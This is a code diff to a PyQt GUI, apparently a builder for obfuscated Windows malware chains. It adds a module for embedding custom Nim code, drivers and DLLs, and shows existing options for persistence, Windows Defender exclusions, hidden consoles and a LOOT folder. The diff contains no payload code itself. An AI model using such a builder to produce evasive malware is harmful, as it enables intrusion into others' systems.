@@ -39,6 +39,9 @@ MODULES = {
     },
     'module/undeleteme': {
         'desc': 'Gains persistence and can add a Windows Defender exclusion.'
+    },
+    'module/byovf': {
+        'desc': 'Bring your own Nim file and embed secondary files (e.g., drivers, DLLs).'
     }
 }
 
@@ -87,6 +90,10 @@ MODULE_OPTIONS = {
     'module/undeleteme': {
         'persistence': 'true',
         'defenderExclusion': 'true'
+    },
+    'module/byovf': {
+        'nimFile': 'path/to/your/module.nim',
+        'embedFiles': 'path/to/driver.sys,path/to/cert.pem'
     }
 }
 
@@ -1182,6 +1189,15 @@ class RABIDSGUI(QMainWindow):
                 else:
                     input_widget = QLineEdit(value)
                     input_widget.setFont(subtitle_font)
+
+                if option in ['nimFile', 'embedFiles', 'dumpsterFile', 'inputDir', 'outputDir', 'targetDir']:
+                    browse_btn = QPushButton("Browse...")
+                    if option == 'embedFiles':
+                        browse_btn.clicked.connect(partial(self.browse_open_files, input_widget))
+                    else:
+                        browse_btn.clicked.connect(partial(self.browse_open_file, input_widget))
+                    option_row.addWidget(browse_btn)
+
                 option_row.addWidget(option_label)
                 option_row.addWidget(input_widget)
                 self.options_layout.addLayout(option_row)
@@ -1405,6 +1421,10 @@ class RABIDSGUI(QMainWindow):
         if not self.exe_name_input.text():
             self.log_message("Error: Output executable name is required.", "error")
             return
+        if len(self.selected_modules) == 1:
+            self.log_message("Error: At least two modules are required to build a chain.", "error")
+            self.tab_widget.setCurrentIndex(1) # Switch to OUTPUT tab
+            return
 
         loot_dir = Path(self.script_dir) / 'LOOT'
         loot_dir.mkdir(exist_ok=True)
@@ -1436,7 +1456,7 @@ class RABIDSGUI(QMainWindow):
         if self.obfuscate_check.isChecked():
             cmd.append("--obfuscate")
             if self.ollvm_input.text():
-                cmd.extend(["--ollvm"] + self.ollvm_input.text().split())
+                cmd.extend(["--ollvm", self.ollvm_input.text().strip()])
 
         if self.hide_console_check.isChecked() and self.target_os_combo.currentText() == "windows":
             cmd.append("--hide-console")
@@ -1498,7 +1518,26 @@ class RABIDSGUI(QMainWindow):
     def browse_open_file(self, line_edit):
         file_path, _ = QFileDialog.getOpenFileName(self, "Open Dumpster File", "", "All Files (*)")
         if file_path:
-            line_edit.setText(file_path)
+            home_path = str(Path.home())
+            if file_path.startswith(home_path):
+                line_edit.setText(file_path.replace(home_path, "$HOME", 1))
+            else:
+                line_edit.setText(file_path)
+
+    def browse_open_files(self, line_edit):
+        """Opens a file dialog to select multiple files and populates the line_edit with a comma-separated list."""
+        file_paths, _ = QFileDialog.getOpenFileNames(self, "Select Files to Embed", "", "All Files (*)")
+        if file_paths:
+            home_path = str(Path.home())
+            processed_paths = []
+            for path in file_paths:
+                if path.startswith(home_path):
+                    processed_paths.append(path.replace(home_path, "$HOME", 1))
+                else:
+                    processed_paths.append(path)
+            
+            # Append to existing list or create a new one
+            line_edit.setText(",".join(processed_paths))
 
     def run_garbage_collector_restore(self):
         self.update_restore_destination_view()
